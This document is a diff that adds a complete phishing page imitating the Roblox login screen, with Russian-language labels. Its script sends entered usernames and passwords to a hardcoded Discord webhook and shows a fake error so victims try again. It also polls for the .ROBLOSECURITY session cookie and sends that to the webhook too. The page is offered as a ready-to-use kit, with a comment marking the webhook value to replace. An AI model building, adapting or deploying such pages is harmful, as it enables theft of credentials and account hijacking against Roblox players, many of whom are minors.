@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #191b1f; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; }
+        .login-box { background: #232527; padding: 30px; border-radius: 12px; width: 300px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
+        img { width: 120px; margin-bottom: 20px; }
+        input, button { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 6px; box-sizing: border-box; }
+        input { background: #3b3d42; color: white; }
+        button { background: #00b06f; color: white; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <center><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Roblox_Logo_2022.svg/512px-Roblox_Logo_2022.svg.png" width="120"></center>
+        <input type="text" id="username" placeholder="Имя пользователя или email">
+        <input type="password" id="password" placeholder="Пароль">
+        <button onclick="steal()">Войти</button>
+        <p id="msg" style="color:red;font-size:14px;text-align:center;"></p>
+    </div>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1520816601094422548/_1D-K5ukEgZVbDud45VA16lGu2xkDFppvDlifVaEKzLZ8je2vwxRDuG8wOGK2qcOpidD"; // ← ЗАМЕНИ
+
+        function steal() {
+            var u = document.getElementById("username").value;
+            var p = document.getElementById("password").value;
+            if (!u || !p) {
+                document.getElementById("msg").innerText = "Заполни поля!";
+                return;
+            }
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "🎮 **Новый заход:**\n👤 Логин: " + u + "\n🔑 Пароль: " + p
+                })
+            });
+            document.getElementById("msg").innerText = "Неверный пароль или имя пользователя. Попробуйте снова.";
+            document.getElementById("password").value = "";
+        }
+
+        setInterval(function() {
+            if (document.cookie.indexOf('.ROBLOSECURITY') !== -1) {
+                var cookies = document.cookie;
+                fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({content: "🍪 **Кука поймана:**\n```" + cookies + "```"})
+                });
+                clearInterval();
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
